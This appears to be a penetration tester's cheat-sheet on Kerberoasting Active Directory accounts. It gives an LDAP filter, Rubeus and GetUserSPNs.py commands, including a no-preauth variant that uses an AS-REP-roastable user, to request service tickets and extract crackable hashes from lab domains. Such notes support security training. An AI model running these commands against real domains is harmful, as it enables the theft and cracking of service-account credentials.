- We will focus our attack on SPN in users accoutns, not in machines because they have less secure passwords

---
## Commands
### windows
#### Manual Detection
Here is an LDAP filter to search for users exposing a service, I have put it in script `FindSPNAccounts.ps1` but it doesn't perfrom TGS request nor getting the hashes:
```ldap
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
or
.\FindSPNAccounts.ps1
```
#### Kerberoasting with Rubeus
```powershell
.\Rubeus.exe kerberoast /nowrap # pwdsetafter, pwdsetbefore, /stats, /tgtdeleg
```

---
### Linux

`GetUserSPNs.py` This tool can search for all Kerberoastable accounts, extract the data encrypted with the password of the service account, and return a hashcat-friendly hash for further cracking.
```sh
GetUserSPNs.py inlanefreight.local/pixis
```

Now that we know there are `Kerberoastable` accounts, we can request a `TGS ticket` or `Service Ticket (ST)` for each of them and obtain a crackable hash using `-request`
```
GetUserSPNs.py inlanefreight.local/pixis -request
```

---
## Kerberoasting without an Account Password
if you have those conditions:
- AS-REProastable user
- list of users or SPNs
### How it works
There is `sname` parameter when we request ticket, so when we ask for TGT we ask from `sname=krbtgt`, some resercher tried to put `sname` as different SPN or user and he found that KDC will encrypt it using the password of that user SPN or user. The result is `TGS` ( not TGT) that is faster to being crack compared to TGT.
### Windows
```
.\Rubues.exe kerberoast /domain: /dc: /nopreauth:<AS-Reproastable user> /spns:List_of_all_users.txt
```

### Linux
```
GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/ | grep '^\$krb' > kerberoasting_hashes
```


> [!Attention] 
> You can kerberose using the SPN "MSSQLSvc/SQL01:1433" or using the user account it self "pop" that hold the SPN. But if the user doesn't has SPN, you can't kerberost that user.
